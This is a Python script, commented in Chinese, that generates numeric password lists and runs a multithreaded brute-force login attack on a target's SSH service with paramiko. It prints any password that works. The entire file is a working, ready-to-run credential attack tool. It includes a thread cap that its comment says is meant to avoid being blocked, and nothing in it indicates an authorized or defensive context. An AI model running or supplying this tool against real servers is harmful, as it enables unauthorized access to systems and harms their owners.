import sys
import time
import itertools
import paramiko
import threading
from queue import Queue
from paramiko.ssh_exception import (
    AuthenticationException, SSHException, NoValidConnectionsError
)

# 全局变量用于标记是否找到密码
found_password = None
found_event = threading.Event()


def generate_password_dict(length=2, chars="1234567890", filename="passwords.txt"):
    """生成指定长度的密码字典"""
    print(f"正在生成{length}位密码字典...")
    with open(filename, "w") as f:
        for combo in itertools.product(chars, repeat=length):
            password = ''.join(combo)
            f.write(password + "\n")
    total = len(chars) ** length
    print(f"密码字典生成完成，保存至 {filename}，共 {total} 个密码")
    return filename


def ssh_login_worker(server, username, port, queue):
    """SSH登录工作线程"""
    global found_password
    ssh = None

    while not queue.empty() and not found_event.is_set():
        password = queue.get()
        try:
            # 显示当前尝试的密码（只在主线程显示，避免混乱）
            # 尝试登录
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                hostname=server,
                port=port,
                username=username,
                password=password,
                timeout=5,  # 缩短超时时间
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=5
            )

            # 找到密码，设置全局变量并触发事件
            found_password = password
            found_event.set()
            return

        except AuthenticationException:
            pass  # 密码错误，继续
        except (NoValidConnectionsError, SSHException, Exception) as e:
            # 非密码错误，只在第一次发生时显示
            if not found_event.is_set():
                print(f"\n错误: {str(e)}")
                found_event.set()  # 遇到致命错误，终止所有线程
            return
        finally:
            if ssh:
                try:
                    ssh.close()
                except:
                    pass
            queue.task_done()


def brute_force_ssh(server, username, dict_file, port=22, threads=10):
    """多线程暴力破解SSH密码"""
    global found_password
    found_password = None
    found_event.clear()

    print(f"开始暴力破解 {server}:{port} 的SSH账号 {username}...")
    print(f"使用 {threads} 个线程并发尝试...")
    start_time = time.time()

    # 读取密码字典到队列
    password_queue = Queue()
    with open(dict_file, "r") as f:
        for password in f:
            password_queue.put(password.strip())

    # 启动工作线程
    worker_threads = []
    for _ in range(threads):
        thread = threading.Thread(
            target=ssh_login_worker,
            args=(server, username, port, password_queue)
        )
        thread.daemon = True
        thread.start()
        worker_threads.append(thread)

    # 显示进度
    total = password_queue.qsize()
    while not found_event.is_set() and not password_queue.empty():
        remaining = password_queue.qsize()
        progress = (total - remaining) / total * 100
        print(f"进度: {progress:.1f}%  ({total - remaining}/{total})", end="\r")
        time.sleep(0.5)

    # 等待所有线程结束
    for thread in worker_threads:
        thread.join()

    end_time = time.time()
    if found_password:
        print(f"\n成功！找到密码: {found_password}")
        print(f"耗时 {end_time - start_time:.2f} 秒")
        return found_password
    else:
        print(f"\n破解完成，未找到有效密码")
        print(f"共尝试 {total} 次，耗时 {end_time - start_time:.2f} 秒")
        return None


def main():
    if len(sys.argv) not in [4, 6]:
        print("使用方法: python faster_ssh_brute_force.py <目标IP> <用户名> <密码长度> [端口] [线程数]")
        print("示例: python faster_ssh_brute_force.py 192.168.1.100 Administrator 3 22 10")
        sys.exit(1)

    target_ip = sys.argv[1]
    username = sys.argv[2]
    port = int(sys.argv[4]) if len(sys.argv) >= 5 else 22
    threads = int(sys.argv[5]) if len(sys.argv) == 6 else 10

    # 限制线程数（避免过多导致被屏蔽）
    threads = max(1, min(50, threads))  # 线程数控制在1-50之间

    try:
        password_length = int(sys.argv[3])
        if password_length < 1:
            raise ValueError
    except ValueError:
        print("密码长度必须是正整数")
        sys.exit(1)

    # 生成密码字典
    dict_file = generate_password_dict(
        length=password_length,
        chars="0123456789"
    )

    # 开始暴力破解
    brute_force_ssh(target_ip, username, dict_file, port, threads)


if __name__ == "__main__":
    main()
